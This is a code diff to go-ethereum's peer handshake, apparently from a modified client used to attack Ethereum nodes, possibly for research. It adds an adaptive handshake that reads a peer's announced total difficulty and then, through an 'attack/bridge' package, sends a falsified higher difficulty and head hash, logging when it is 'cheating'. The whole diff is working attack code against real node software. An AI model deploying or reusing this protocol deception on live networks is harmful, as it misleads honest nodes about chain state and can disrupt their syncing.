@@ -24,6 +24,7 @@ import (
 	"github.com/ethereum/go-ethereum/common"
 	"github.com/ethereum/go-ethereum/core/forkid"
 	"github.com/ethereum/go-ethereum/p2p"
+	"github.com/ethereum/go-ethereum/log"
 
 	"github.com/ethereum/go-ethereum/attack/bridge"
 )
@@ -34,26 +35,12 @@ const (
 	handshakeTimeout = 5 * time.Second
 )
 
-// Handshake executes the eth protocol handshake, negotiating version number,
-// network IDs, difficulties, head and genesis blocks.
-func (p *Peer) Handshake(network uint64, td *big.Int, head common.Hash, genesis common.Hash, forkID forkid.ID, forkFilter forkid.Filter) error {
+func (p *Peer) nonAdaptiveHandshake(network uint64, td *big.Int, head common.Hash, genesis common.Hash, forkID forkid.ID, forkFilter forkid.Filter) error {
 	// Send out own handshake in a new thread
 	errc := make(chan error, 2)
 
 	var status StatusPacket // safe to read after two values have been received from errc
 
-	higherTd, mustCheat, errb := bridge.CheatAboutTd(p.Peer.ID().String()[:8])
-	if errb != nil {
-		return errb
-	}
-	if mustCheat {
-		/*
-		higherHead, _ := bridge.GetHigherHeadAndPivot()
-		head = higherHead.Hash()
-		*/
-		td = higherTd
-		head = bridge.Latest().Hash()
-	}
 	go func() {
 		errc <- p2p.Send(p.rw, StatusMsg, &StatusPacket{
 			ProtocolVersion: uint32(p.version),
@@ -80,6 +67,90 @@ func (p *Peer) Handshake(network uint64, td *big.Int, head common.Hash, genesis 
 		}
 	}
 	p.td, p.head = status.TD, status.Head
+
+	// TD at mainnet block #7753254 is 76 bits. If it becomes 100 million times
+	// larger, it will still fit within 100 bits
+	if tdlen := p.td.BitLen(); tdlen > 100 {
+		return fmt.Errorf("too large total difficulty: bitlen %d", tdlen)
+	}
+	return nil
+}
+
+// Handshake executes the eth protocol handshake, negotiating version number,
+// network IDs, difficulties, head and genesis blocks.
+func (p *Peer) Handshake(network uint64, td *big.Int, head common.Hash, genesis common.Hash, forkID forkid.ID, forkFilter forkid.Filter) error {
+	if bridge.IsMalicious(p.Peer.ID().String()[:8]) {
+		return p.nonAdaptiveHandshake(network, td, head, genesis, forkID, forkFilter)
+	}
+
+	errc := make(chan error, 2)
+
+	var status StatusPacket // safe to read after two values have been received from errc
+
+	go func() {
+		errc <- p.readStatus(network, &status, genesis, forkFilter)
+	}()
+	timeout := time.NewTimer(handshakeTimeout)
+	defer timeout.Stop()
+
+	/*
+	for i := 0; i < 2; i++ {
+		select {
+		case err := <-errc:
+			if err != nil {
+				return err
+			}
+		case <-timeout.C:
+			return p2p.DiscReadTimeout
+		}
+	}
+	*/
+
+	select {
+	case err := <-errc:
+		if err != nil {
+			return err
+		}
+	case <-timeout.C:
+		return p2p.DiscReadTimeout
+	}
+
+	p.td, p.head = status.TD, status.Head
+	log.Info("Peer announced its TD", "peer", p.Peer.ID().String()[:8], "td", status.TD)
+
+	higherTd, mustCheat, errb := bridge.CheatAboutTd(p.Peer.ID().String()[:8], status.TD)
+	if errb != nil {
+		return errb
+	}
+	if mustCheat {
+		log.Info("Cheating about TD", "peer", p.Peer.ID().String()[:8], "td", higherTd)
+		td = higherTd
+		head = bridge.Latest().Hash()
+	} else {
+		log.Info("Not cheating about TD", "peer", p.Peer.ID().String()[:8], "td", td)
+	}
+
+	go func() {
+		errc <- p2p.Send(p.rw, StatusMsg, &StatusPacket{
+			ProtocolVersion: uint32(p.version),
+			NetworkID:       network,
+			TD:              td,
+			Head:            head,
+			Genesis:         genesis,
+			ForkID:          forkID,
+		})
+	}()
+
+	timeout2 := time.NewTimer(handshakeTimeout)
+	defer timeout2.Stop()
+	select {
+	case err := <-errc:
+		if err != nil {
+			return err
+		}
+	case <-timeout2.C:
+		return p2p.DiscReadTimeout
+	}
 
 	// TD at mainnet block #7753254 is 76 bits. If it becomes 100 million times
 	// larger, it will still fit within 100 bits
